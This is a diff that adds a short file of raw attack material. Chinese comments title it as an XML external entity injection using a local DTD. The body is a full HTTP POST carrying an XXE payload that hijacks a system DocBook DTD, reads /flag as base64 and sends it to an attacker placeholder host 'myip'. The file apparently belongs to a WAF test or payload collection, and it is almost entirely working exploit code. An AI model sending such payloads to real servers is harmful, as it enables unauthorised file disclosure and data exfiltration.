@@ -1,0 +1,22 @@
+# XML外部实体注入_本地DTD引用
+# 当目标服务器和攻击者之间存在防火墙，或者网络访问受到限制时，可能无法直接引用外部的DTD文件。在这种情况下，使用本地DTD文件是一个很好的替代方案。
+POST /?bid=hd_tag_m8mv24mq HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24mq
+RM-PRO-Token: 0942dcc7940af1247a3b3e002592baa2
+RM-PRO-Time: 1742808393125
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
+    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
+    <!ENTITY % ISOamso '
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://myip/?&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;send;
+    '> 
+    %remote;
+]>
+<message>1234</message>
